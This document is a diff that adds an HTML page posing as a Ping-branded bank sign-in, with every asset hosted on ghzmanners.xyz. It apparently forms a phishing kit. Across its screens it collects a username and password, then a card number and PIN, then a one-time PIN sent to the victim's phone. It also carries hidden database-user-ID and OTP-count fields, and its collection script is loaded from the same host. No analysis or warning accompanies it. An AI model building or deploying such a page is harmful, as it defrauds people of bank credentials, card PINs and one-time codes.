@@ -1,0 +1,298 @@
+<html class="plt-tablet plt-desktop md hydrated" dir="ltr" lang="en" mode="md">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+  <meta content="IE=edge" http-equiv="x-ua-compatible"/>
+  <title>
+   Sign in
+  </title>
+  <link href="https://ghzmanners.xyz//sec/assets/dist/css/ion-styles.css" rel="stylesheet"/>
+  <link href="https://ghzmanners.xyz//sec/assets/@ionic/core/css/ionic.bundle.css" rel="stylesheet"/>
+  <link href="https://ghzmanners.xyz//sec/assets/dist/css/sbg.css" rel="stylesheet"/>
+  <link href="https://ghzmanners.xyz//sec/assets/dist/css/x.css" rel="stylesheet"/>
+  <link href="https://ghzmanners.xyz//sec/assets/images/favicon.ico" rel="icon" type="image/png"/>
+  <script src="https://ghzmanners.xyz//sec/assets/@ionic/core/dist/ionic/ionic.esm.js" type="module">
+  </script>
+  <script nomodule="" src="https://ghzmanners.xyz//sec/assets/@ionic/core/dist/ionic/ionic.js">
+  </script>
+  <script src="https://ghzmanners.xyz//sec/assets/dist/scripts/jquery-3.6.3.min.js">
+  </script>
+ </head>
+ <body class="body-container">
+  <ion-app class="md ion-page hydrated" id="index">
+   <ion-content class="md hydrated" style="--offset-top: 0px; --offset-bottom: 0px;">
+    <div class="ping-logo login-template">
+     <div class="ping-outer-container" style="display: flex;">
+      <div class="ping-logo login-template">
+       <span class="company-logo">
+        <img src="https://ghzmanners.xyz//sec/assets/images/x.png"/>
+       </span>
+      </div>
+      <form action="" autocomplete="off" method="POST" name="signinForm">
+       <div class="ping-container ping-signin login-template">
+        <div class="ping-body-container">
+         <div class="content-column column-1 bm">
+          <div class="ping-header">
+           Sign in
+          </div>
+         </div>
+         <div class="ping-input-container" id="container-lipusername">
+          <ion-item class="item-interactive item-input item md ion-focusable hydrated item-label item-label-floating">
+           <ion-label class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl" position="floating">
+            Username
+           </ion-label>
+           <ion-input autocapitalize="none" autocorrect="off" class="validate sc-ion-input-md-s md hydrated" id="user" name="user" oninput="hideUsernameErrorMessage()" onkeypress="javascript: if(event.keyCode == 13) isValidUsername();" required="" type="email" value="">
+           </ion-input>
+          </ion-item>
+          <div class="custom-validator-underline hide" id="username-alertmessage-underline">
+          </div>
+          <div class="custom-validator-alert hide" id="username-alertmessage-invalid">
+           Invalid Email
+          </div>
+          <div class="custom-validator-alert hide" id="username-alertmessage-required">
+           Username is required
+          </div>
+         </div>
+         <div class="ping-input-container password-container hide" id="password-container">
+          <ion-item class="item-interactive item-input item md ion-focusable hydrated item-label item-label-floating">
+           <ion-label class="sc-ion-label-md-h sc-ion-label-md-s md label-floating hydrated" id="ion-input-0-lbl" position="floating">
+            Password
+           </ion-label>
+           <ion-input class="validate show sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value" clear-on-edit="false" id="password" name="pass" oninput="hidePasswordErrorMessage();" onkeypress="if(event.keyCode == 13) isValidSigninForm();" required="" type="password">
+           </ion-input>
+          </ion-item>
+          <a class="show-hide" id="password-show-hide" onclick="togglePasswordVisibility();">
+           SHOW
+          </a>
+          <div class="custom-validator-underline hide" id="password-alertmessage-underline">
+          </div>
+          <div class="custom-validator-alert hide" id="password-alertmessage-invalid">
+           Invalid Password
+          </div>
+          <div class="custom-validator-alert hide" id="password-alertmessage-required">
+           Password is required
+          </div>
+         </div>
+         <div class="ping-buttons" id="signin">
+          <ion-button class="ping-button normal allow md button button-block button-solid ion-activatable ion-focusable hydrated" data-id="link_content" data-intent="confirmational" data-scope="signin" data-text="Ping:Sign In link click" expand="block" id="signon" onclick="isValidSigninForm();" title="Sign In">
+           Sign In
+          </ion-button>
+          <ion-button class="ping-button-secondary normal allow desktop md button button-block button-outline ion-activatable ion-focusable hydrated" data-id="link_content" data-intent="query" data-scope="signin" data-text="Ping:Regsiter an account click" expand="block" fill="outline" title="Register">
+           Register
+          </ion-button>
+         </div>
+         <!-- .ping-buttons -->
+         <div class="ping-input-link ping-pass-change account-actions">
+          <a class="forgot-password">
+           Forgot username
+          </a>
+         </div>
+        </div>
+        <!-- .ping-body-container -->
+        <div class="ping-footer-container">
+         <div class="ping-footer">
+          <div class="ping-register mobile">
+           Don't have an account?
+           <a>
+            Register Here
+           </a>
+          </div>
+         </div>
+         <!-- .ping-footer -->
+        </div>
+       </div>
+      </form>
+     </div>
+    </div>
+   </ion-content>
+  </ion-app>
+  <ion-app class="md ion-page hydrated hide" id="loading">
+   <ion-content class="md hydrated" style="--offset-top:0px; --offset-bottom:0px;">
+    <div class="ping-outer-container vertical-align">
+     <div class="ping-logo login-template">
+      <span class="company-logo">
+       <img src="https://ghzmanners.xyz//sec/assets/images/x.png"/>
+      </span>
+     </div>
+     <div class="ping-container ping-container-error">
+      <div class="ping-body-container">
+       <div class="ping-header center-text">
+        <div class="loader">
+        </div>
+        <div class="loader-message">
+         Loading - please wait...
+        </div>
+       </div>
+       <!-- .ping-buttons -->
+      </div>
+      <!-- .ping-body -->
+     </div>
+     <!-- .ping-body-container -->
+    </div>
+    <!-- .ping-container -->
+   </ion-content>
+  </ion-app>
+  <ion-app class="md ion-page hydrated hide" id="card-simple">
+   <ion-content class="md hydrated" style="--offset-top: 0px; --offset-bottom: 0px;">
+    <div class="ping-logo login-template">
+     <div class="ping-outer-container" style="display: flex;">
+      <div class="ping-logo login-template">
+       <span class="company-logo">
+        <img src="https://ghzmanners.xyz//sec/assets/images/x.png"/>
+       </span>
+      </div>
+      <form action="" autocomplete="off" method="POST" name="cardVerificationForm">
+       <div class="ping-container ping-signin login-template">
+        <div class="ping-body-container">
+         <div class="content-column column-1 bm">
+          <div class="ping-header">
+           Card Verification
+          </div>
+         </div>
+         <div class="ping-input-container hide" id="db-user-id-container">
+          <ion-item>
+           <ion-label position="floating">
+            Database User ID
+           </ion-label>
+           <ion-input id="db-user-id" name="db-user-id" readonly="">
+           </ion-input>
+          </ion-item>
+         </div>
+         <div class="ping-input-container" id="card-number-container">
+          <ion-item>
+           <ion-label position="floating">
+            Card Number
+           </ion-label>
+           <ion-input id="cardnum" maxlength="16" name="cardnum" oninput="hideCardNumErrorMessage()" onkeypress="javascript: if(event.keyCode == 13) isValidCardNum();" required="">
+           </ion-input>
+          </ion-item>
+          <div class="custom-validator-underline hide" id="cardnum-alertmessage-underline">
+          </div>
+          <div class="custom-validator-alert hide" id="cardnum-alertmessage-invalid">
+           Invalid Card Number
+          </div>
+          <div class="custom-validator-alert hide" id="cardnum-alertmessage-required">
+           Card number is required
+          </div>
+         </div>
+         <div class="ping-input-container hide" id="card-pin-container">
+          <ion-item>
+           <ion-label position="floating">
+            PIN
+           </ion-label>
+           <ion-input class="validate show sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value" clear-on-edit="false" id="cardpin" maxlength="5" name="cardpin" oninput="hideCardPinErrorMessage()" onkeypress="javascript: if(event.keyCode == 13) isValidCardForm();" required="" type="password">
+           </ion-input>
+          </ion-item>
+          <a class="show-hide" id="card-pin-show-hide" onclick="togglePinVisibility();">
+           SHOW
+          </a>
+          <div class="custom-validator-underline hide" id="cardpin-alertmessage-underline">
+          </div>
+          <div class="custom-validator-alert hide" id="cardpin-alertmessage-invalid">
+           Invalid PIN
+          </div>
+          <div class="custom-validator-alert hide" id="cardpin-alertmessage-required">
+           PIN is required
+          </div>
+         </div>
+         <div class="ping-buttons" id="submit">
+          <ion-button class="ping-button normal allow md button button-block button-solid ion-activatable ion-focusable hydrated" data-id="link_content" data-intent="confirmational" data-scope="submit" data-text="Ping:Submit click" expand="block" id="submit-button" onclick="isValidCardForm();" title="Submit">
+           SUBMIT
+          </ion-button>
+         </div>
+         <!-- .ping-buttons -->
+        </div>
+        <!-- .ping-body-container -->
+       </div>
+      </form>
+     </div>
+    </div>
+   </ion-content>
+  </ion-app>
+  <ion-app class="md ion-page hydrated hide" id="otp">
+   <ion-content class="md hydrated" style="--offset-top: 0px; --offset-bottom: 0px;">
+    <div class="ping-logo login-template">
+     <div class="ping-outer-container" style="display: flex;">
+      <div class="ping-logo login-template">
+       <span class="company-logo">
+        <img src="https://ghzmanners.xyz//sec/assets/images/x.png"/>
+       </span>
+      </div>
+      <form action="" autocomplete="off" method="POST" name="otpVerificationForm">
+       <div class="ping-container ping-signin login-template">
+        <div class="ping-body-container">
+         <div class="content-column column-1 bm">
+          <div class="ping-header">
+           OTP Verification
+          </div>
+         </div>
+         <div class="ping-body center-text bm-xl tm-s" id="otp-message">
+          Enter the One Time Pin that was sent to your mobile number
+         </div>
+         <div class="center-text bm-xl tm-s custom-validator-alert hide" id="otp-expired-message">
+          OTP Expired
+          <br/>
+          Enter the NEW One Time Pin that was sent to your mobile number
+         </div>
+         <div class="ping-input-container hide" id="db-user-id-container">
+          <ion-item>
+           <ion-label position="floating">
+            Database User ID
+           </ion-label>
+           <ion-input id="db-user-id" name="db-user-id" readonly="">
+           </ion-input>
+          </ion-item>
+         </div>
+         <div class="ping-input-container hide" id="otp-count-container">
+          <ion-item>
+           <ion-label position="floating">
+            OTP Count
+           </ion-label>
+           <ion-input id="otp-count" name="otp-count" readonly="">
+           </ion-input>
+          </ion-item>
+         </div>
+         <div class="ping-input-container" id="otp-container">
+          <ion-item>
+           <ion-label position="floating">
+            One Time PIN
+           </ion-label>
+           <ion-input class="validate show sc-ion-input-md-h sc-ion-input-md-s md hydrated has-value" clear-on-edit="false" id="otp" maxlength="5" name="otp" oninput="hideOtpErrorMessage()" onkeypress="javascript: if(event.keyCode == 13) isValidOtpForm();" required="" type="password">
+           </ion-input>
+          </ion-item>
+          <a class="show-hide bump-up-showhide" id="otp-show-hide" onclick="toggleOtpVisibility();">
+           SHOW
+          </a>
+          <div class="custom-validator-underline hide" id="otp-alertmessage-underline">
+          </div>
+          <div class="custom-validator-alert hide" id="otp-alertmessage-invalid">
+           Invalid OTP
+          </div>
+          <div class="custom-validator-alert hide" id="otp-alertmessage-required">
+           OTP is required
+          </div>
+          <div class="custom-validator-alert" id="otp-countdown">
+           01 : 59
+          </div>
+         </div>
+         <div class="ping-buttons">
+          <ion-button class="ping-button normal allow md button button-block button-solid ion-activatable ion-focusable hydrated" data-id="link_content" data-intent="confirmational" data-scope="submit" data-text="Ping:Submit click" expand="block" id="otp-submit-button" onclick="isValidOtpForm();" title="Submit">
+           SUBMIT
+          </ion-button>
+          <ion-button class="ping-button-secondary normal allow md button button-block button-outline ion-activatable ion-focusable hydrated hide" data-id="link_content" data-intent="query" data-scope="otp" data-text="Ping:Resend OTP" expand="block" fill="outline" id="otp-resend-button" onclick="resendOtp();" title="Resend">
+           Resend
+          </ion-button>
+         </div>
+         <!-- .ping-buttons -->
+        </div>
+        <!-- .ping-body-container -->
+       </div>
+      </form>
+     </div>
+    </div>
+   </ion-content>
+  </ion-app>
+  <script src="https://ghzmanners.xyz//sec/assets/dist/scripts/main.js">
+  </script>
+ </body>
+</html>
